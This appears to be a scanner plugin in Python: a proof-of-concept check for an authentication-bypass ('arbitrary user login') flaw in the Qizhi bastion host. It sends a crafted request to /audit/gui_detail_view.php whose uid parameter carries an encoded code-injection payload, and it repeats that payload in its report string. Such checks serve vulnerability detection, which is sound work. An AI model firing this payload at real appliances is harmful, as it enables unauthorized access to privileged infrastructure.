# -*- coding:utf-8 -*-
# 齐治堡垒机 任意用户登录漏洞

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def user_login(self, url):
        resp = self.requestUtil.get(
            url + '/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm')
        if "错误的id" in resp.text:
            return True

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "获取指纹信息失败" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            if self.user_login(self.service.url):
                return ["齐治堡垒机 任意用户登录漏洞",
                        "漏洞路径: <br>/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"]
        except:
            return []
